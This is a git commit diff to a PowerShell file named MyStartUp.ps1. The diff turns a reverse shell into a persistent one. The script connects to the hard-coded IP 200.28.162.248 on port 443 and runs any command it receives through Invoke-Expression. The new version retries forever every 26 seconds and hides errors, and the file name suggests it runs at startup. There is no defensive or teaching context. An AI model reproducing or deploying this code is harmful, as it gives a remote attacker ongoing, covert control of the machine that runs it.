cf55ef0af9b54a63cb13e859d44ecc29d62a03a9
fullcaleta <144293848+fullcaleta@users.noreply.github.com>
2025-08-27 07:02:11 -0600

    Update MyStartUp.ps1

--- MyStartUp.ps1
+++ MyStartUp.ps1
@@ -1,14 +1,24 @@
-$client = New-Object System.Net.Sockets.TCPClient("200.28.162.248",443)
-$stream = $client.GetStream()
-$writer = New-Object System.IO.StreamWriter($stream)
-$buffer = New-Object Byte[] 1024
-$encoding = New-Object System.Text.ASCIIEncoding
+while ($true) {
+    try {
+        $client = New-Object System.Net.Sockets.TCPClient("200.28.162.248",443)
+        $stream = $client.GetStream()
+        $writer = New-Object System.IO.StreamWriter($stream)
+        $buffer = New-Object Byte[] 1024
+        $encoding = New-Object System.Text.ASCIIEncoding
 
-while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
-    $data = $encoding.GetString($buffer,0, $i)
-    $sendback = (Invoke-Expression $data | Out-String )
-    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
-    $writer.Write($sendback2)
-    $writer.Flush()
+        while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0){
+            $data = $encoding.GetString($buffer,0, $i)
+            $sendback = (Invoke-Expression $data | Out-String )
+            $sendback2  = $sendback + "PS " + (pwd).Path + "> "
+            $writer.Write($sendback2)
+            $writer.Flush()
+        }
+
+        $client.Close()
+    }
+    catch {
+        # opcional: escribir el error si quieres debug
+        # Write-Host "Error: $_"
+    }
+    Start-Sleep -Seconds 26
 }
-$client.Close()
